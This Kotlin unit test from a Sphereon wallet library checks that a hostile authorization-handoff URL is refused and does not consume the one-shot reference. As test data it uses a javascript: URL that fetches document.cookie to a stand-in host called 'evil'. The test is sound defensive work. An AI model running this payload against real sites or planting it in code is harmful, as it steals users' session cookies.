/*
 * Copyright 2026 Sphereon International B.V.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 */

package com.sphereon.wallet.interaction.impl

import com.sphereon.core.api.Err
import com.sphereon.core.api.IdkResult
import com.sphereon.core.api.Ok
import com.sphereon.core.api.conf.AppConfigService
import com.sphereon.core.api.conf.ConfigLevel
import com.sphereon.core.api.conf.ConfigService
import com.sphereon.core.api.conf.PrincipalConfigService
import com.sphereon.core.api.conf.TenantConfigService
import com.sphereon.core.api.context.ContextConfig
import com.sphereon.core.api.context.IdkScope
import com.sphereon.core.api.context.SessionExecution
import com.sphereon.core.api.error.IdkError
import com.sphereon.core.api.error.IdkErrorType
import com.sphereon.core.api.log.AsyncLogService
import com.sphereon.core.api.log.LogMessage
import com.sphereon.core.api.log.LogService
import com.sphereon.core.api.log.LoggerConfig
import com.sphereon.core.api.log.SessionLogManager
import com.sphereon.core.api.log.SessionLogService
import com.sphereon.di.context.NoOpSessionContext
import com.sphereon.di.session.SessionContext
import com.sphereon.di.session.SessionContextManager
import com.sphereon.wallet.interaction.ConsumeWalletInteractionHandoffArgs
import com.sphereon.wallet.interaction.WalletEntryPoint
import com.sphereon.wallet.interaction.WalletInteractionInput
import com.sphereon.wallet.interaction.WalletInteractionSensitiveInputAuthority
import com.sphereon.wallet.interaction.WalletInteractionSensitiveInputPurpose
import com.sphereon.wallet.interaction.WalletInteractionSensitiveInputRef
import com.sphereon.wallet.interaction.WalletInteractionSessionId
import com.sphereon.wallet.interaction.WalletSecurityGrant
import kotlinx.coroutines.test.runTest
import kotlin.test.Test
import kotlin.test.assertEquals
import kotlin.test.assertTrue

class ConsumeWalletInteractionAuthorizationHandoffCommandImplTest {
    @Test
    fun `a hostile URL on a passthrough authority is not handed out and does not spend`() =
        runTest {
            val execution = TestSessionExecution()
            val engine =
                testWalletInteractionEngine(
                    adapters = listOf(StaticWalletInteractionProtocolAdapter.oid4vci()),
                )
            val session =
                engine.start(
                    WalletInteractionInput("wallet", WalletEntryPoint.rawQr("openid-credential-offer://?credential_offer=x")),
                )
            val authority = PassthroughSensitiveInputAuthority()
            val hostile = "javascript:fetch(\"//evil/\"+document.cookie)"
            val ref =
                authority.register(
                    session.sessionId,
                    WalletInteractionSensitiveInputPurpose.OID4VCI_AUTHORIZATION_HANDOFF,
                    hostile,
                )
            val command =
                ConsumeWalletInteractionAuthorizationHandoffCommandImpl(execution, engine, authority)
            val args = ConsumeWalletInteractionHandoffArgs("wallet", session.sessionId, ref)

            val first = command.execute(args)
            assertTrue(first is Err, "a hostile URL must not be handed out")
            assertEquals(
                "wallet_interaction_authorization_handoff_unopenable",
                (first as Err).error.message.defaultMessage,
            )

            val second = command.execute(args)
            assertTrue(second is Err, "a refused URL must not spend the one-shot")
            assertEquals(
                "wallet_interaction_authorization_handoff_unopenable",
                (second as Err).error.message.defaultMessage,
            )
            assertEquals(
                hostile,
                authority.consume(
                    session.sessionId,
                    WalletInteractionSensitiveInputPurpose.OID4VCI_AUTHORIZATION_HANDOFF,
                    ref,
                ),
            )
        }

    private class PassthroughSensitiveInputAuthority : WalletInteractionSensitiveInputAuthority {
        private val values = mutableMapOf<String, Pair<WalletInteractionSensitiveInputPurpose, String>>()
        private var sequence = 0

        override suspend fun register(
            sessionId: WalletInteractionSessionId,
            purpose: WalletInteractionSensitiveInputPurpose,
            value: String,
        ): WalletInteractionSensitiveInputRef {
            val ref = WalletInteractionSensitiveInputRef("passthrough-${++sequence}")
            values[key(sessionId, ref)] = purpose to value
            return ref
        }

        override suspend fun peek(
            sessionId: WalletInteractionSessionId,
            purpose: WalletInteractionSensitiveInputPurpose,
            ref: WalletInteractionSensitiveInputRef,
        ): String? {
            val stored = values[key(sessionId, ref)] ?: return null
            return stored.second.takeIf { stored.first == purpose }
        }

        override suspend fun consume(
            sessionId: WalletInteractionSessionId,
            purpose: WalletInteractionSensitiveInputPurpose,
            ref: WalletInteractionSensitiveInputRef,
        ): String? {
            val stored = values[key(sessionId, ref)] ?: return null
            if (stored.first != purpose) return null
            values.remove(key(sessionId, ref))
            return stored.second
        }

        override suspend fun registerSecurityGrant(
            sessionId: WalletInteractionSessionId,
            grant: WalletSecurityGrant,
        ): WalletInteractionSensitiveInputRef =
            register(sessionId, WalletInteractionSensitiveInputPurpose.INTERACTION_SECURITY_GRANT, grant.grantId)

        override suspend fun consumeSecurityGrant(
            sessionId: WalletInteractionSessionId,
            ref: WalletInteractionSensitiveInputRef,
        ): WalletSecurityGrant? = null

        override suspend fun clear(sessionId: WalletInteractionSessionId) {
            values.keys.removeAll { it.startsWith("${sessionId.value}:") }
        }

        private fun key(
            sessionId: WalletInteractionSessionId,
            ref: WalletInteractionSensitiveInputRef,
        ): String = "${sessionId.value}:${ref.value}"
    }

    private class TestSessionExecution(
        override val sessionContext: SessionContext = NoOpSessionContext,
    ) : SessionExecution {
        override val sessionContextManager: SessionContextManager
            get() = throw NotImplementedError("Not needed for test")
        override val log: SessionLogService = NoOpSessionLogService(sessionContext)
        override val conf: ContextConfig = NoOpContextConfig()
    }

    private class NoOpSessionLogService(
        override val sessionContext: SessionContext,
    ) : SessionLogService {
        override val id: String = "wallet-interaction-handoff-command-test-log"
        override val isEnabled: Boolean = false
        override val scope: IdkScope = IdkScope.SESSION
        override val logManager: SessionLogManager
            get() = throw NotImplementedError("Not needed for test")

        override suspend fun setConfig(config: LoggerConfig): LogService = this

        override fun executeAsync(message: LogMessage): IdkResult<Unit, IdkErrorType> = Ok(Unit)

        override fun toAsync(): AsyncLogService = throw NotImplementedError("Not needed for test")
    }

    private class NoOpContextConfig : ContextConfig {
        override val app: AppConfigService
            get() = throw NotImplementedError("Not needed for test")
        override val tenant: TenantConfigService
            get() = throw NotImplementedError("Not needed for test")
        override val principal: PrincipalConfigService
            get() = throw NotImplementedError("Not needed for test")

        override fun conf(level: ConfigLevel): ConfigService = throw NotImplementedError("Not needed for test")
    }
}
